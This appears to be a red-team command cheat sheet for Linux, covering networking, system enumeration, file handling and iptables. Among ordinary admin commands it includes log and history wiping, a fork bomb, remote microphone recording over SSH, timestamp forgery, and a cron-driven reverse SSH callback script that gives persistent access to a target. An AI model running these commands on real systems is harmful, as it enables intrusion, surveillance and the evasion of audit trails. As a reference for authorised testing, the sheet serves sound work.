# *NIX

## Linux Network Commands:
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
watch ss -tp                                                | Network connections
netstat -ant                                                | Tcp connections
netstat -anu                                                | Udp connections
netstat -tulpn                                              | Connetions with PIDs
lsof -i                                                     | Established connections
smb://<ip>/share                                            | Access windows smb share
share user x.x.x.x c$                                       | Mount Windows share
smbclient -U user \\\\<ip>\\<share>                         | SMB connect
ifconfig eth# <ip>/<cidr>                                   | Set IP and netmask
ifconfig eth0:1 <ip>/<cidr>                                 | Set virtual interface
route add default gw <gw_ip>                                | Set GW
ifconfig eth# mtu [size]                                    | Change MTU size
export MAC=xx:xx:xx:xx:xx:xx                                | Change MAC
ifconfig <int> hw ether <MAC>                               | Change MAC
macchanger -m <MAC> <int>                                   | Backtrack MAC changer
iwlist <int> scan                                           | Built-in wifi scanner
dig -x <ip>                                                 | Domain lookup for IP
host <ip>                                                   | Domain lookup for IP
host -t SRV _<service> tcp.url.com                          | Domain SRV lookup
dig @<ip> domain -t AXFR                                    | DNS Zone Xfer
host -l <domain> <namesvr>                                  | DNS Zone Xfer
ip xfrm state list                                          | Print existing VPN keys
ip addr add <ip>/<cird> dev eth0                            | Adds `hidden' interface
/var/log/messages | grep DHCP                               | List DHCP assignments
tcpkill host <ip> and port <port>                           | Block ip:port
echo "1" > /proc/sys/net/ipv4/ip_forward                    | Turn on IP Forwarding
echo "nameserver x.x.x.x" > /etc/resolv.conf                | Add DNS Server

## Linux System Info
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
nbtstat -A <ip>                                             | Get hostname for <ip>
id                                                          | Current username
w                                                           | Logged on user
who -a                                                      | User information
last -a                                                     | Last users logged on
ps -ef                                                      | Process listing (top)
df -h                                                       | Disk usage (free)
uname -a                                                    | Kernel version/CPU info
mount                                                       | Mounted file systems
getent passwd                                               | Show list of users
PATH=$PATH:/home/mypath                                     | Add to PATH variable
kill <pid>                                                  | kills process with <pid>
cat /etc/issue                                              | Show OS info
cat /etc/*release*                                          | Show OS version info
cat /proc/version                                           | Show kernel info
rpm --query -all                                            | Installed pkgs (Redhat)
rpm -ivh *.rpm                                              | Install RPM (-e=remove)
dpkg -get-selections                                        | Installed pkgs (Ubuntu)
dpkg -I *.deb                                               | Install DEB (-r=remove)
pkginfo                                                     | Installed pkgs (Solaris)
which <tscsh/csh/ksh/bash>                                  | Show location of executable
chmod 750 <tcsh/csh/ksh>                                    | Disable <shell>, force bash

## Linux Utility Commands
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
wget http://<url> -O url.txt -o /dev/null                   | Grab url
rdesktop <ip>                                               | Remote Desktop to <ip>
scp /tmp/file user@x.x.x.x:/tmp/file                        | Put file
scp user@<remoteip>:/tmp/file /tmp/file                     | Get file
useradd -m <user>                                           | Add user
passwd <user>                                               | Change user password
rmuser uname                                                | Remover user
script -a <outfile>                                         | Record shell : Ctrl-D stops
apropos <subject>                                           | Find related command
history                                                     | View users command history
!<num>                                                      | Executes line # in history

## Linux File Commands
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
diff file1 file2                                            | Compare files
rm -rf <dir>                                                | Force delete of <dir>
shred -f -u <file>                                          | Overwrite/delete file
touch -r <ref_file> <file>                                  | Matches ref_file timestamp
touch -t YYYYMMDDHHSS <file>                                | Set file timestamp
sudo fdisk -l                                               | List connected drives
mount /dev/sda# /mnt/usbkey                                 | Mount USB key
md5sum -t file                                              | Compute md5 hash
echo -n "str" | md5sum                                      | Generate md5 hash
sha1sum file                                                | SHA1 hash of file
sort -u                                                     | Sort/show unique lines
grep -c "str" file                                          | Count lines w/ "str"
tar cf file.tar files                                       | Create .tar from files
tar xf file.tar                                             | Extract .tar
tar czf file.tar.gz files                                   | Create .tar.gz
tar xzf file.tar.gz                                         | Extract .tar.gz
tar cjf file.tar.bz2 files                                  | Create .tar.bz2
tar xjf file.tar.bz2                                        | Extract .tar.bz2
gzip file                                                   | Compress/rename file
gzip -d file.gz                                             | Decompress file.gz
upx -9 -o out.exe orig.exe                                  | UPX packs orig.exe
zip -r <zipname.zip> \Directory\*                           | Create zip
dd skip=1000 count=2000 bs=8 if=file of=file                | Cut block 1K-3K from file
split -b 9K \<fiile> <prefix>                               | Split file into 9K chunks
awk 'sub("$"."\r")' unix.txt > win.txt                      | Win xompatible txt file
find -i -name <file> -type *.pdf                            | Find PDF files
find / -perm -4000 -o -perm -2000 -exec ls -ldb { } \;      | Search for setuid files
dos2unix <file>                                             | Convert to *nix format
file <file>                                                 | Determine file type/info
chattr (+/-)i <file>                                        | Set/Unset immutable bit

## Linux Misc Commands
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
unset HISTFILE                                              | Disable history logging
ssh user@<ip> arecord - | aplay -                           | Record remote mic
gcc -o outfile myfile.c                                     | Compile C,C++
init 6                                                      | Reboot (0 = shutdown)
cat /etc/*syslog*.conf | grep -v "^#"                       | List of log files
grep 'href=' <file> | cut -d "/" -f3 | grep <url> | sort -u | strip links in url.com
dd if=/dev/urandom of=<file> bs=3145728 count=100           | Make random 3MB file

## Linux "cover your tracks" commands
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
echo "" > /var/log/auth.log                                 | Clear auth.log file
echo "" > ~/.bash_history                                   | Clear current user bash history
rm ~/.bash_history -rf                                      | Delete .bash_history file
history -c                                                  | Clear current session history
export HISTFILESIZE=0                                       | Set history max lines to 0
export HISTSIZE=0                                           | Set history max commands to 0
unset HISTFILE                                              | Disable history logging (need to logout to take effect)
kill -9 $$                                                  | Kills current session
ln /dev/null ~/.bash_history -sf                            | Permanently send all bash history commands to /dev/null

## Linux File System Structure
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
/bin                                                        | User binaries
/boot                                                       | Boot-up related files
/dev                                                        | Interface for system devices
/etc                                                        | System configuration files
/home                                                       | Base directory for user files
/lib                                                        | Critical software libraries
/opt                                                        | Third party software
/proc                                                       | System and running programs
/root                                                       | Home directory of root user
/sbin                                                       | System administrator binaries
/tmp                                                        | Temporary files
/usr                                                        | Less critical files
/var                                                        | Variable system files

## Linux Files
Command                                                     | Description
----------------------------------------------------------- | ---------------------------------------
/etc/shadow                                                 | Local users` hashes
/etc/passwd                                                 | Local users
/etc/group                                                  | Local groups
/etc/rc.d                                                   | Startup services
/etc/init.d                                                 | Service
/etc/hosts                                                  | Known hostnames and IPs
/etc/HOSTNAME                                               | Full hostname with domain
/etc/network/interfaces                                     | Network configuration
/etc/profile                                                | System environment variables
/etc/apt/sources.list                                       | Ubuntu sources list
/etc/resolv.conf                                            | Nameserver configuration
/home/<user>/.bash_history                                  | Bash history (also /root/)
/usr/share/wireshark/manuf                                  | Vendor-MAC lookup
~/.ssh/                                                     | SSH keystore
/var/log                                                    | System log files (most Linux)
/var/adm                                                    | System log files (Unix)
/var/spool/cron                                             | List cron files
/var/log/apache/access.log                                  | Apache connection log
/etc/fstab                                                  | Static file system info

## Linux Scripting
### Ping Sweep
for x in {1..254..1}; do ping -c 1 1.1.1.$x | grep "64 b" | cut -d " " -f4 >> ips.txt; done

### Automated Domain Name Resolve Bash Script
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read Range
for IP in {1..254..1};do
host $Range.$IP | grep "name pointer" | cut -d " " -f5
done

### Fork Bomb (Creates Processes Until System "Crashes")
:(){:|:&};:

### DNS Reverse Lookup
for ip in {1..254..1}; do dig -x 1.1.1.$ip | grep $ip >> dns.txt; done;

### IP Banning Script
\#!/bin/sh
\# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
\# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while [ $i -le 253 ]
do
    if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
        echo "BANNED: arp -s 192.168.1.$i"
        arp -s 192.168.1.$i 00:00:00:00:00:0a
    else
        echo "IP NOT BANNED: 192.168.1.$i ************************"
        echo "**************************************************"
    fi
    i=`expr $i +1`
done

### SSH Callback
Set up script in crontab to callback every X minutes. Highly recommend you set up a generic user on red team computer (with no shell privs). Script will use the private key (located on callback source computer) to connect to a public key (on red team computer). Red teamer connects to target via a local SSH session (in the example below, use \#ssh -p4040 localhost)

#!/bin/bash
# Callback script located on callback source computer (target)
killall ssh >/dev/null 2>&1
sleep 5
REMLIS=4040
REMUSR=user
HOSTS="domain1.com domain2.com domain3.com"
for LIVEHOST in $HOSTS;
do
    COUNT=$ (ping -c2 $LIVEHOST | grep 'received' | awk -F',' '{ print $2 }' | awk '{ print $1 }')
    if [[ $COUNT -gt 0 ]]; then
        ssh -R ${REMLIS}:localhost:22 -i "/home/${REMUSR}/.ssh/id_rsa" -N ${LIVEHOST} -l ${REMUSR}
    fi

## IPTables
\* Use ip6tables for IPv6 rules
Command                                                                          | Description
-------------------------------------------------------------------------------- | ---------------------------------------
iptables-save -c > <file>                                                        | Dump iptables (with counters) rules to stdout
iptables-restore <file>                                                          | Restore iptables rules
iptables -L -v --line-numbers                                                    | List all iptables rules with affected and line numbers
iptables -F                                                                      | Flush all iptables rules
ipables -P <INPUT/FORWARD/OUTPUT> <ACCEPT/REJECT/DROP>                           | Change default policy for rules that don't match rules
iptables -A INPUT -i <interface> -m state --state RELATED, ESTABLISHED -j ACCEPT | Allow established connections on INPUT
iptables -D INPUT 7                                                              | Delete 7th inbound rule
iptables -t raw -L -n                                                            | Increase throughput by turning off statefulness
iptables -P INPUT DROP                                                           | Drop all packets

## Allow SSH on port 22 outbound
\> iptables -A OUTPUT -o <iface> -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
\> iptables -A INPUT -i <iface> -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

## Allow ICMP Outbound
\> iptables -A OUTPUT -i <iface> -p icmp --icmp-type echo-request -j ACCEPT
\> iptables -A INPUT -o <iface> -p icmp --icmp-type echo-reply -j ACCEPT

## Port Forward
\> echo "1" > /proc/sys/net/ipv4/ip_forward
\# OR -> sysctl net.ipv4.ip_forward=1